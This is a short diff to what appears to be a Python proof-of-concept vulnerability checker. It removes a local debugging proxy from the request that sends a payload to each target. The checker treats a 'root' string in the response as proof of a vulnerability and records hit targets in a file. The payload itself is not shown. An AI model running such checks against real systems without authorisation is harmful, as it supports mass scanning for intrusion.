@@ -69,7 +69,7 @@ def poc(target):
         'https': 'https://127.0.0.1:8080'
     }
     try:
-        res1 = requests.get(url=target + payload, headers=headers, verify=False, timeout=5, proxies=proxies)
+        res1 = requests.get(url=target + payload, headers=headers, verify=False, timeout=5)
         if res1.status_code == 200 and 'root' in res1.text:
             logger.info(f"[+] {target} 存在漏洞")
             with open("shengoure.txt", 'a') as f:
